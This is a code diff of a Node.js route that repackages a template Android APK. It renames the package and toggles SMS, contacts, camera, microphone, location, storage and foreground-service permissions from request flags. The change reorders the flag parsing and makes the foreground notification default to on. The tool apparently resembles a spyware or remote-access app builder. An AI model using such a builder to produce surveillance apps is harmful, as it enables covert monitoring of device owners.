@@ -264,6 +264,14 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 arscEntry.header.method = 0;
             }
 
+            const isSmsEnabled             = enableSmsPermission === 'true';
+            const isContactsEnabled        = enableContactsPermission === 'true';
+            const isCameraEnabled          = enableCameraPermission === 'true';
+            const isMicEnabled             = enableMicrophonePermission === 'true';
+            const isLocationEnabled        = enableLocationPermission === 'true';
+            const isStorageEnabled         = enableStoragePermission !== 'false';
+            const isForegroundNotifEnabled = enableForegroundNotification !== 'false';
+
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
             const manifestEntry = zip.getEntry('AndroidManifest.xml');
             if (manifestEntry) {
@@ -272,14 +280,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 if (targetPkg !== OLD_PKG) {
                     patchManifestPackageOnly(manifestBuf, targetPkg);
                 }
-
-                const isSmsEnabled             = enableSmsPermission === 'true';
-                const isContactsEnabled        = enableContactsPermission === 'true';
-                const isCameraEnabled          = enableCameraPermission === 'true';
-                const isMicEnabled             = enableMicrophonePermission === 'true';
-                const isLocationEnabled        = enableLocationPermission === 'true';
-                const isStorageEnabled         = enableStoragePermission !== 'false';
-                const isForegroundNotifEnabled = enableForegroundNotification === 'true';
 
                 const permsToNeutralize = [];
                 if (!isSmsEnabled) {
